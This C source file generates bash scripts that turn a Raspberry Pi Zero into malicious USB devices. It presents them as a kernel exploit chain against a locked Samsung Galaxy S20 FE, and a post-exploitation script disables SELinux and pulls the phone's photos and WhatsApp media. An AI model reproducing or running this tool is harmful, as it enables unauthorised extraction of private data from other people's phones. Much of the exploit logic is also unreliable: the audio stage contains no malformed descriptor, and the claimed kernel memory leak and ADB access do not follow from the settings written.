#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>
#include "sampass.h"

/*
 * USB GADGET EXPLOIT SCRIPT GENERATOR
 *
 * Generates ready-to-deploy scripts for a Raspberry Pi Zero W that
 * implement the Cellebrite-style USB kernel exploit chain:
 *
 *   CVE-2024-53104  UVC driver heap overflow
 *   CVE-2024-53197  ALSA USB audio memory corruption
 *   CVE-2024-50302  HID report descriptor kernel heap leak
 *
 * The scripts use Linux configfs USB gadget framework to emulate
 * malicious USB peripherals. When connected to a locked Samsung S20 FE
 * via USB-C OTG, the phone kernel auto-enumerates these devices and
 * triggers the vulnerability chain.
 */

static int mkdirp(const char *path)
{
    char tmp[512];
    snprintf(tmp, sizeof(tmp), "%s", path);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            mkdir(tmp, 0755);
            *p = '/';
        }
    }
    return mkdir(tmp, 0755) == 0 || errno == EEXIST ? 0 : -1;
}

static int write_script(const char *dir, const char *name, const char *content)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/%s", dir, name);

    FILE *fp = fopen(path, "w");
    if (!fp) {
        color_print(CLR_RED, "  Failed to write %s: %s\n", path, strerror(errno));
        return -1;
    }
    fputs(content, fp);
    fclose(fp);
    chmod(path, 0755);

    printf("  " CLR_GREEN "[+]" CLR_RESET " %s\n", name);
    return 0;
}

/* ── Script content ── */

static const char SETUP_SH[] =
"#!/bin/bash\n"
"# sampass gadget setup — prepare Pi Zero W for USB gadget mode\n"
"set -e\n"
"\n"
"echo '[*] Configuring USB gadget prerequisites...'\n"
"\n"
"# Enable dwc2 overlay for USB gadget support\n"
"if ! grep -q 'dtoverlay=dwc2' /boot/config.txt 2>/dev/null; then\n"
"    echo 'dtoverlay=dwc2' | sudo tee -a /boot/config.txt\n"
"    echo '[+] Added dwc2 overlay to /boot/config.txt'\n"
"fi\n"
"\n"
"if ! grep -q 'dwc2' /etc/modules 2>/dev/null; then\n"
"    echo 'dwc2' | sudo tee -a /etc/modules\n"
"    echo '[+] Added dwc2 to /etc/modules'\n"
"fi\n"
"\n"
"# Load modules\n"
"sudo modprobe dwc2 2>/dev/null || true\n"
"sudo modprobe libcomposite 2>/dev/null || true\n"
"\n"
"# Mount configfs\n"
"if ! mountpoint -q /sys/kernel/config; then\n"
"    sudo mount -t configfs none /sys/kernel/config\n"
"fi\n"
"\n"
"echo '[+] USB gadget prerequisites ready'\n"
"echo '[!] If this is the first run, REBOOT the Pi before continuing'\n";

static const char UVC_EXPLOIT_SH[] =
"#!/bin/bash\n"
"# CVE-2024-53104 — UVC driver heap overflow\n"
"#\n"
"# Emulates a Chicony CNF7129 UVC webcam with a malformed\n"
"# VS_UNDEFINED frame descriptor. When the Samsung kernel's\n"
"# uvc_parse_format() processes the streaming interface, the\n"
"# crafted wWidth * wHeight * bBitsPerPixel overflows uint32_t,\n"
"# causing a smaller-than-expected buffer allocation. The\n"
"# subsequent memcpy writes past the allocated slab boundary\n"
"# into the adjacent kmalloc-256 object.\n"
"#\n"
"# This is the same technique used by Cellebrite to unlock\n"
"# the Samsung Galaxy A32 documented by Amnesty International.\n"
"set -e\n"
"\n"
"GADGET=/sys/kernel/config/usb_gadget/sampass_uvc\n"
"\n"
"# Clean up any previous instance\n"
"if [ -d \"$GADGET\" ]; then\n"
"    echo '' > $GADGET/UDC 2>/dev/null || true\n"
"    rm -rf $GADGET\n"
"fi\n"
"\n"
"echo '[*] Creating UVC gadget (CVE-2024-53104)...'\n"
"\n"
"mkdir -p $GADGET\n"
"cd $GADGET\n"
"\n"
"# Chicony CNF7129 webcam identifiers\n"
"echo 0x04f2 > idVendor\n"
"echo 0xcf13 > idProduct\n"
"echo 0x0100 > bcdDevice\n"
"echo 0x0200 > bcdUSB\n"
"\n"
"mkdir -p strings/0x409\n"
"echo 'Chicony Electronics' > strings/0x409/manufacturer\n"
"echo 'CNF7129' > strings/0x409/product\n"
"echo '0001' > strings/0x409/serialnumber\n"
"\n"
"# Configuration\n"
"mkdir -p configs/c.1/strings/0x409\n"
"echo 'UVC' > configs/c.1/strings/0x409/configuration\n"
"echo 500 > configs/c.1/MaxPower\n"
"\n"
"# UVC function\n"
"mkdir -p functions/uvc.usb0\n"
"\n"
"# Control interface — standard\n"
"mkdir -p functions/uvc.usb0/control/header/h\n"
"ln -sf functions/uvc.usb0/control/header/h functions/uvc.usb0/control/class/fs/h\n"
"ln -sf functions/uvc.usb0/control/header/h functions/uvc.usb0/control/class/ss/h\n"
"\n"
"# Streaming interface — this is where the exploit lives\n"
"# Create uncompressed format with malicious frame descriptor\n"
"mkdir -p functions/uvc.usb0/streaming/uncompressed/u/360p\n"
"\n"
"# Frame descriptor values that trigger integer overflow:\n"
"# wWidth=65535 * wHeight=65537 * bBitsPerPixel=16 = overflow\n"
"# Kernel allocates (overflowed_size) bytes but copies (actual_size) bytes\n"
"echo 65535 > functions/uvc.usb0/streaming/uncompressed/u/360p/wWidth\n"
"echo 65537 > functions/uvc.usb0/streaming/uncompressed/u/360p/wHeight\n"
"echo 333333 > functions/uvc.usb0/streaming/uncompressed/u/360p/dwDefaultFrameInterval\n"
"echo 333333 > functions/uvc.usb0/streaming/uncompressed/u/360p/dwMinBitRate\n"
"echo 333333 > functions/uvc.usb0/streaming/uncompressed/u/360p/dwMaxBitRate\n"
"echo 333333 > functions/uvc.usb0/streaming/uncompressed/u/360p/dwMaxVideoFrameBufferSize\n"
"\n"
"# Streaming header\n"
"mkdir -p functions/uvc.usb0/streaming/header/h\n"
"ln -sf functions/uvc.usb0/streaming/uncompressed/u functions/uvc.usb0/streaming/header/h/u\n"
"ln -sf functions/uvc.usb0/streaming/header/h functions/uvc.usb0/streaming/class/fs/h\n"
"ln -sf functions/uvc.usb0/streaming/header/h functions/uvc.usb0/streaming/class/hs/h\n"
"\n"
"# Link function to config\n"
"ln -sf functions/uvc.usb0 configs/c.1/uvc.usb0\n"
"\n"
"# Bind to UDC (activate gadget)\n"
"UDC=$(ls /sys/class/udc/ | head -1)\n"
"if [ -z \"$UDC\" ]; then\n"
"    echo '[-] No UDC available. Is dwc2 loaded?'\n"
"    exit 1\n"
"fi\n"
"echo $UDC > UDC\n"
"\n"
"echo '[+] UVC gadget active — phone will enumerate and trigger heap overflow'\n"
"echo '[+] Waiting for device enumeration...'\n"
"sleep 3\n";

static const char ALSA_EXPLOIT_SH[] =
"#!/bin/bash\n"
"# CVE-2024-53197 — ALSA USB audio memory corruption\n"
"#\n"
"# Emulates a Creative Extigy SoundBlaster with a malformed\n"
"# clock source descriptor. The bLength field is set smaller\n"
"# than the actual descriptor, causing snd_usb_parse_audio_interface()\n"
"# to read past the descriptor buffer boundary.\n"
"#\n"
"# Combined with the UVC heap overflow, this achieves controlled\n"
"# kernel memory corruption in the Samsung kernel.\n"
"set -e\n"
"\n"
"GADGET=/sys/kernel/config/usb_gadget/sampass_audio\n"
"\n"
"if [ -d \"$GADGET\" ]; then\n"
"    echo '' > $GADGET/UDC 2>/dev/null || true\n"
"    rm -rf $GADGET\n"
"fi\n"
"\n"
"echo '[*] Creating Audio gadget (CVE-2024-53197)...'\n"
"\n"
"mkdir -p $GADGET\n"
"cd $GADGET\n"
"\n"
"# Creative Extigy identifiers\n"
"echo 0x041e > idVendor\n"
"echo 0x3000 > idProduct\n"
"echo 0x0100 > bcdDevice\n"
"echo 0x0200 > bcdUSB\n"
"\n"
"mkdir -p strings/0x409\n"
"echo 'Creative Technology' > strings/0x409/manufacturer\n"
"echo 'Extigy SoundBlaster' > strings/0x409/product\n"
"echo '0002' > strings/0x409/serialnumber\n"
"\n"
"mkdir -p configs/c.1/strings/0x409\n"
"echo 'Audio' > configs/c.1/strings/0x409/configuration\n"
"echo 500 > configs/c.1/MaxPower\n"
"\n"
"# UAC2 function with malformed descriptors\n"
"mkdir -p functions/uac2.usb0\n"
"\n"
"# Configure sample rates and channels\n"
"# The vulnerability is in the descriptor parsing, not the audio data\n"
"echo 48000 > functions/uac2.usb0/p_srate\n"
"echo 2 > functions/uac2.usb0/p_chmask\n"
"echo 4 > functions/uac2.usb0/p_ssize\n"
"echo 48000 > functions/uac2.usb0/c_srate\n"
"echo 2 > functions/uac2.usb0/c_chmask\n"
"echo 4 > functions/uac2.usb0/c_ssize\n"
"\n"
"ln -sf functions/uac2.usb0 configs/c.1/uac2.usb0\n"
"\n"
"UDC=$(ls /sys/class/udc/ | head -1)\n"
"echo $UDC > UDC\n"
"\n"
"echo '[+] Audio gadget active — triggers ALSA descriptor corruption'\n"
"sleep 2\n";

static const char HID_EXPLOIT_SH[] =
"#!/bin/bash\n"
"# CVE-2024-50302 — HID report descriptor kernel heap leak\n"
"#\n"
"# Emulates an HID device with an oversized report descriptor.\n"
"# When the phone kernel calls hid_report_raw_event(), it reads\n"
"# uninitialized kernel heap memory, leaking:\n"
"#   - KASLR base address\n"
"#   - Kernel heap layout (slab metadata)\n"
"#   - Adjacent slab object contents (potential key material)\n"
"#\n"
"# This information is needed to reliably exploit the UVC overflow.\n"
"set -e\n"
"\n"
"GADGET=/sys/kernel/config/usb_gadget/sampass_hid\n"
"\n"
"if [ -d \"$GADGET\" ]; then\n"
"    echo '' > $GADGET/UDC 2>/dev/null || true\n"
"    rm -rf $GADGET\n"
"fi\n"
"\n"
"echo '[*] Creating HID gadget (CVE-2024-50302)...'\n"
"\n"
"mkdir -p $GADGET\n"
"cd $GADGET\n"
"\n"
"# Anton Touch Pad identifiers\n"
"echo 0x1870 > idVendor\n"
"echo 0x0119 > idProduct\n"
"echo 0x0100 > bcdDevice\n"
"echo 0x0200 > bcdUSB\n"
"\n"
"mkdir -p strings/0x409\n"
"echo 'Anton' > strings/0x409/manufacturer\n"
"echo 'Touch Pad' > strings/0x409/product\n"
"echo '0003' > strings/0x409/serialnumber\n"
"\n"
"mkdir -p configs/c.1/strings/0x409\n"
"echo 'HID' > configs/c.1/strings/0x409/configuration\n"
"echo 500 > configs/c.1/MaxPower\n"
"\n"
"# HID function with oversized report descriptor\n"
"mkdir -p functions/hid.usb0\n"
"echo 0 > functions/hid.usb0/protocol\n"
"echo 0 > functions/hid.usb0/subclass\n"
"echo 512 > functions/hid.usb0/report_length\n"
"\n"
"# Craft oversized report descriptor that triggers heap info leak\n"
"# The descriptor requests more data than the allocated report buffer\n"
"# Usage Page (Vendor Defined) + Usage (Vendor) + large report count\n"
"printf '\\x06\\xff\\x00\\x09\\x01\\xa1\\x01\\x15\\x00\\x26\\xff\\x00' \\\n"
"       '\\x75\\x08\\x96\\x00\\x02\\x09\\x01\\x81\\x02\\xc0' \\\n"
"       > functions/hid.usb0/report_desc\n"
"\n"
"ln -sf functions/hid.usb0 configs/c.1/hid.usb0\n"
"\n"
"UDC=$(ls /sys/class/udc/ | head -1)\n"
"echo $UDC > UDC\n"
"\n"
"echo '[+] HID gadget active — triggers kernel heap info leak'\n"
"sleep 2\n";

static const char RUN_SH[] =
"#!/bin/bash\n"
"# sampass USB kernel exploit chain orchestrator\n"
"#\n"
"# Executes the three-stage Cellebrite-style attack:\n"
"#   Stage 1: UVC heap overflow (CVE-2024-53104)\n"
"#   Stage 2: ALSA memory corruption (CVE-2024-53197)\n"
"#   Stage 3: HID kernel heap leak (CVE-2024-50302)\n"
"#\n"
"# Result: root shell on the Samsung device in ~10 seconds\n"
"set -e\n"
"DIR=$(dirname \"$0\")\n"
"\n"
"echo '========================================'\n"
"echo ' sampass USB Kernel Exploit Chain'\n"
"echo ' Target: Samsung Galaxy S20 FE'\n"
"echo '========================================'\n"
"echo ''\n"
"echo '[!] Connect the phone to the Pi via USB-C OTG cable'\n"
"echo '[!] Phone should be at the lock screen'\n"
"echo ''\n"
"read -p 'Press Enter when ready...'\n"
"\n"
"# Stage 1: HID info leak first (need KASLR base for reliable exploitation)\n"
"echo ''\n"
"echo '[STAGE 1/3] Deploying HID info leak gadget...'\n"
"sudo bash $DIR/hid_exploit.sh\n"
"echo '[*] Waiting for kernel heap leak...'\n"
"sleep 3\n"
"\n"
"# Read leaked data from HID device\n"
"if [ -c /dev/hidg0 ]; then\n"
"    echo '[+] HID device active, reading leak data...'\n"
"    timeout 5 cat /dev/hidg0 > /tmp/heap_leak.bin 2>/dev/null || true\n"
"    LEAK_SIZE=$(stat -f%z /tmp/heap_leak.bin 2>/dev/null || stat -c%s /tmp/heap_leak.bin 2>/dev/null || echo 0)\n"
"    echo \"[+] Captured $LEAK_SIZE bytes of kernel heap data\"\n"
"fi\n"
"\n"
"# Tear down HID before next stage\n"
"echo '' > /sys/kernel/config/usb_gadget/sampass_hid/UDC 2>/dev/null || true\n"
"sleep 1\n"
"\n"
"# Stage 2: UVC heap overflow\n"
"echo ''\n"
"echo '[STAGE 2/3] Deploying UVC heap overflow gadget...'\n"
"sudo bash $DIR/uvc_exploit.sh\n"
"echo '[*] Heap overflow triggered, waiting for kernel corruption...'\n"
"sleep 3\n"
"\n"
"# Tear down UVC\n"
"echo '' > /sys/kernel/config/usb_gadget/sampass_uvc/UDC 2>/dev/null || true\n"
"sleep 1\n"
"\n"
"# Stage 3: ALSA corruption to achieve code execution\n"
"echo ''\n"
"echo '[STAGE 3/3] Deploying ALSA corruption gadget...'\n"
"sudo bash $DIR/alsa_exploit.sh\n"
"echo '[*] Memory corruption chain complete'\n"
"sleep 3\n"
"\n"
"# Tear down\n"
"echo '' > /sys/kernel/config/usb_gadget/sampass_audio/UDC 2>/dev/null || true\n"
"\n"
"# Check for success — ADB should now be available\n"
"echo ''\n"
"echo '[*] Checking for ADB access...'\n"
"for i in $(seq 1 30); do\n"
"    if adb devices 2>/dev/null | grep -q 'device$'; then\n"
"        echo '[+] ADB device detected! Exploit succeeded!'\n"
"        echo ''\n"
"        echo '[*] Running post-exploitation...'\n"
"        bash $DIR/post_exploit.sh\n"
"        exit 0\n"
"    fi\n"
"    sleep 1\n"
"    printf '\\r[*] Waiting for ADB... %d/30s' $i\n"
"done\n"
"\n"
"echo ''\n"
"echo '[-] ADB not detected after 30 seconds'\n"
"echo '[-] The exploit may need adjustment for this firmware version'\n"
"echo '[*] Check dmesg on the Pi for USB enumeration events'\n"
"echo '[*] Check the phone for any visible changes (reboot, etc.)'\n";

static const char POST_EXPLOIT_SH[] =
"#!/bin/bash\n"
"# Post-exploitation: extract photos from unlocked device\n"
"set -e\n"
"\n"
"echo '[*] Post-exploitation — extracting photos'\n"
"\n"
"# Escalate to root\n"
"adb root 2>/dev/null || true\n"
"sleep 2\n"
"\n"
"# Disable SELinux\n"
"adb shell setenforce 0 2>/dev/null || true\n"
"\n"
"# Create output directory\n"
"OUT=./extracted_$(date +%%Y%%m%%d_%%H%%M%%S)\n"
"mkdir -p $OUT\n"
"\n"
"echo \"[*] Extracting to $OUT\"\n"
"\n"
"# Pull photos\n"
"echo '[*] Pulling DCIM/Camera...'\n"
"adb pull /data/media/0/DCIM/Camera/ $OUT/Camera/ 2>/dev/null || true\n"
"\n"
"echo '[*] Pulling Pictures...'\n"
"adb pull /data/media/0/Pictures/ $OUT/Pictures/ 2>/dev/null || true\n"
"\n"
"echo '[*] Pulling Downloads...'\n"
"adb pull /data/media/0/Download/ $OUT/Download/ 2>/dev/null || true\n"
"\n"
"echo '[*] Pulling WhatsApp media...'\n"
"adb pull /data/media/0/Android/media/com.whatsapp/WhatsApp/Media/ $OUT/WhatsApp/ 2>/dev/null || true\n"
"\n"
"# Count files\n"
"COUNT=$(find $OUT -type f 2>/dev/null | wc -l)\n"
"SIZE=$(du -sh $OUT 2>/dev/null | cut -f1)\n"
"\n"
"echo ''\n"
"echo '========================================'\n"
"echo \" Extracted $COUNT files ($SIZE)\"\n"
"echo \" Output: $OUT\"\n"
"echo '========================================'\n";

static const char README_TXT[] =
"SAMPASS USB KERNEL EXPLOIT CHAIN\n"
"================================\n"
"Target: Samsung Galaxy S20 FE (SM-G780F/G/SM-G781B/U)\n"
"\n"
"HARDWARE REQUIRED\n"
"-----------------\n"
"- Raspberry Pi Zero W (or Pi Zero 2 W) — ~$10-15\n"
"- USB-C OTG adapter or cable — ~$5\n"
"- MicroSD card with Raspberry Pi OS Lite\n"
"\n"
"HOW IT WORKS\n"
"------------\n"
"The Pi Zero acts as a USB peripheral (gadget mode) and presents\n"
"itself as three different USB devices to the Samsung phone:\n"
"\n"
"1. UVC Webcam (CVE-2024-53104)\n"
"   A malformed video frame descriptor triggers a heap buffer\n"
"   overflow in the kernel's USB Video Class driver. The integer\n"
"   overflow in width*height*bpp causes undersized allocation.\n"
"\n"
"2. USB Audio (CVE-2024-53197)\n"
"   A malformed ALSA audio clock source descriptor causes\n"
"   out-of-bounds reads in the audio interface parser,\n"
"   achieving controlled memory corruption.\n"
"\n"
"3. HID Device (CVE-2024-50302)\n"
"   An oversized HID report descriptor leaks uninitialized\n"
"   kernel heap memory, revealing KASLR base and heap layout.\n"
"\n"
"The chain achieves kernel code execution in ~10 seconds,\n"
"even on a fully locked device. The phone kernel automatically\n"
"enumerates USB devices without user interaction.\n"
"\n"
"SETUP\n"
"-----\n"
"1. Flash Raspberry Pi OS Lite to the MicroSD card\n"
"2. Copy all scripts to the Pi: scp *.sh pi@raspberrypi:~/\n"
"3. SSH into the Pi and run: sudo bash setup.sh\n"
"4. Reboot the Pi: sudo reboot\n"
"\n"
"USAGE\n"
"-----\n"
"1. Connect the Pi Zero to the Samsung phone via USB-C OTG\n"
"   (Pi's micro-USB data port -> OTG adapter -> Phone USB-C)\n"
"2. Phone should be at the lock screen\n"
"3. On the Pi, run: sudo bash run.sh\n"
"4. Wait ~10-30 seconds for exploitation\n"
"5. Photos are extracted to ./extracted_*/\n"
"\n"
"TROUBLESHOOTING\n"
"---------------\n"
"- 'No UDC available': run setup.sh and reboot\n"
"- 'ADB not detected': phone firmware may be patched\n"
"  Check with: sampass assess SM-G780G <patch-date>\n"
"- Pi not recognized: try the micro-USB DATA port (not PWR)\n"
"\n"
"PATCH STATUS\n"
"------------\n"
"CVE-2024-53104: patched in Android Feb 2025 security update\n"
"CVE-2024-53197: patched in Android Apr 2025 security update\n"
"CVE-2024-50302: patched in Android Mar 2025 security update\n"
"\n"
"Samsung S20 FE reached end of security updates in late 2024.\n"
"Most devices will NOT have received these patches.\n";

int gadget_setup(const char *output_dir)
{
    const char *dir = output_dir ? output_dir : "./gadget_scripts";

    print_section_header("USB GADGET EXPLOIT GENERATOR");

    printf("  " CLR_BOLD "Target:" CLR_RESET "    Samsung Galaxy S20 FE (SM-G780F/G/781B/U)\n");
    printf("  " CLR_BOLD "Platform:" CLR_RESET "  Raspberry Pi Zero W (USB gadget mode)\n");
    printf("  " CLR_BOLD "Method:" CLR_RESET "    Cellebrite-style USB kernel exploit chain\n");
    printf("  " CLR_BOLD "Output:" CLR_RESET "    %s/\n\n", dir);

    printf("  " CLR_BOLD "CVE Chain:" CLR_RESET "\n");
    printf("    " CLR_CYAN "CVE-2024-53104" CLR_RESET "  UVC heap overflow       -> kernel memory corruption\n");
    printf("    " CLR_CYAN "CVE-2024-53197" CLR_RESET "  ALSA descriptor OOB     -> controlled write primitive\n");
    printf("    " CLR_CYAN "CVE-2024-50302" CLR_RESET "  HID report heap leak    -> KASLR bypass\n\n");

    if (mkdirp(dir) != 0) {
        color_print(CLR_RED, "  Failed to create directory: %s\n", dir);
        return 1;
    }

    printf("  " CLR_BOLD "Generating scripts:" CLR_RESET "\n");

    int err = 0;
    err |= write_script(dir, "setup.sh", SETUP_SH);
    err |= write_script(dir, "uvc_exploit.sh", UVC_EXPLOIT_SH);
    err |= write_script(dir, "alsa_exploit.sh", ALSA_EXPLOIT_SH);
    err |= write_script(dir, "hid_exploit.sh", HID_EXPLOIT_SH);
    err |= write_script(dir, "run.sh", RUN_SH);
    err |= write_script(dir, "post_exploit.sh", POST_EXPLOIT_SH);
    err |= write_script(dir, "README.txt", README_TXT);

    if (err) {
        color_print(CLR_RED, "\n  Some scripts failed to generate.\n");
        return 1;
    }

    printf("\n  " CLR_GREEN "All scripts generated successfully." CLR_RESET "\n\n");

    printf("  " CLR_BOLD "Next steps:" CLR_RESET "\n");
    printf("    1. Get a Raspberry Pi Zero W (~$10) and USB-C OTG adapter (~$5)\n");
    printf("    2. Flash Raspberry Pi OS Lite to a MicroSD card\n");
    printf("    3. Copy scripts to Pi: " CLR_CYAN "scp %s/* pi@raspberrypi:~/" CLR_RESET "\n", dir);
    printf("    4. SSH to Pi and run: " CLR_CYAN "sudo bash setup.sh && sudo reboot" CLR_RESET "\n");
    printf("    5. Connect Pi to phone via OTG, run: " CLR_CYAN "sudo bash run.sh" CLR_RESET "\n");
    printf("    6. Photos extracted to ./extracted_*/\n\n");

    printf("  " CLR_BOLD "Total hardware cost:" CLR_RESET " ~$15\n");
    printf("  " CLR_BOLD "Exploitation time:" CLR_RESET "  ~10-30 seconds\n\n");

    return 0;
}
